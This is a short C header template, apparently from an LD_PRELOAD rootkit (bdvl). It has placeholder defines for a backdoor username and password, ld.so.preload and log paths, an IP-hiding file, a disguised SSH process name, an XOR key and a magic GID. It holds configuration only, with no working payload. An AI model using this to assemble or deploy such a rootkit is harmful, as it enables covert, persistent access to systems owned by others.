#define BD_UNAME	"%%BD_UNAME%%"
#define BD_PWD		"%%BD_PWD%%"
#define INSTALL_DIR	"%%IDIR%%"
#define BDVLSO		"%%BDVLSO%%"
#define SOPATH		"%%SOPATH%%"
#define LDSO_PRELOAD	"%%N_PRELOAD%%"
#define LDSO_LOGS	"%%LDSO_LOGS%%"
#define HIDE_IP_PATH	"%%HIDE_IP_PATH%%"
#define BD_SSHPROCNAME	"%%BD_SSHPROCNAME%%"

#define XKEY		%%XKEY%%
#define MAGIC_GID	%%MGID%%

#define PATH_MAX	4096
#define LINE_MAX	2048

typedef struct symbol_struct {
	void *(*func)();
} syms;

#define sizeofarray(arr) sizeof(arr) / sizeof(arr[0])
